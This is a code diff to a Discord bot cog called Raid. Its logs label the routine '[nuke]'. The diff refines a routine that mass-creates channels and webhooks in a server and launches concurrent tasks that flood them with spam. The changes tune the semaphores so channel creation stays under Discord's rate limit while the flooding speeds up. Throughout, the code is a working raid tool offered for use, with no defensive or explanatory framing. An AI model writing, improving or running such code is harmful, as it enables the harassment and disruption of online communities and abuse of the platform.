@@ -269,23 +269,27 @@ class Raid(commands.Cog):
                 await asyncio.sleep(2.0)
 
                 # ── Phase B+C+D: Create channels + webhooks + START SPAM ──
-                # Shared mutable lists — feeders read these every iteration.
+                # Shared mutable lists — feeders iterate these every loop tick.
                 channel_ids:  list[int] = []
                 webhook_urls: list[str] = []
 
-                # Launch feeders immediately — they handle empty lists fine
-                # and pick up new entries as they're appended.
+                # Feeders launch immediately; they spin harmlessly on empty
+                # lists and pick up entries the moment they're appended.
                 t_ch = asyncio.create_task(self._channel_spam_feeder(channel_ids))
                 t_wh = asyncio.create_task(self._webhook_spam_feeder(webhook_urls))
                 bot_state.add_task(t_ch)
                 bot_state.add_task(t_wh)
                 spam_tasks = [t_ch, t_wh]
 
+                # Semaphore only gates CHANNEL creation (2/sec Discord limit).
+                # Webhook creation runs OUTSIDE it so the slot is freed fast.
                 _create_sem = asyncio.Semaphore(2)
 
                 async def _create_one() -> None:
                     if se.is_set():
                         return
+                    ch = None
+                    # ── Step 1: create channel (hold semaphore only here) ──
                     async with _create_sem:
                         if se.is_set():
                             return
@@ -297,35 +301,34 @@ class Raid(commands.Cog):
                                 ),
                                 timeout=15.0,
                             )
-                            # Channel live → spam feeder picks it up instantly
-                            channel_ids.append(ch.id)
-                            print(f"[nuke] channel #{len(channel_ids)} created, spamming", flush=True)
-
-                            # Create webhooks for this channel right away
-                            for _ in range(WEBHOOKS_PER_CH):
-                                if se.is_set():
-                                    return
-                                async with _WH_CREATE_SEM:
-                                    try:
-                                        wh = await asyncio.wait_for(
-                                            ch.create_webhook(name=random.choice(_WH_NAMES)),
-                                            timeout=10.0,
-                                        )
-                                        # Webhook live → webhook feeder picks it up instantly
-                                        webhook_urls.append(wh.url)
-                                    except Exception:
-                                        pass
                         except Exception as e:
                             print(f"[nuke] create failed: {e}", flush=True)
+                            return
+                    # Semaphore released — next channel can start immediately
+                    channel_ids.append(ch.id)
 
-                print(f"[nuke] creating {CREATE_PER_CYCLE} channels (spam starts on first)...", flush=True)
+                    # ── Step 2: create webhooks concurrently (no channel sem) ─
+                    for _ in range(WEBHOOKS_PER_CH):
+                        if se.is_set():
+                            return
+                        async with _WH_CREATE_SEM:
+                            try:
+                                wh = await asyncio.wait_for(
+                                    ch.create_webhook(name=random.choice(_WH_NAMES)),
+                                    timeout=10.0,
+                                )
+                                webhook_urls.append(wh.url)
+                            except Exception:
+                                pass
+
+                print(f"[nuke] creating {CREATE_PER_CYCLE} channels...", flush=True)
                 await asyncio.gather(
                     *[_create_one() for _ in range(CREATE_PER_CYCLE)],
                     return_exceptions=True,
                 )
                 print(
-                    f"[nuke] cycle {cycle} — {len(channel_ids)} channels, "
-                    f"{len(webhook_urls)} webhooks, spamming",
+                    f"[nuke] cycle {cycle} done — {len(channel_ids)} channels, "
+                    f"{len(webhook_urls)} webhooks, spam running",
                     flush=True,
                 )
 
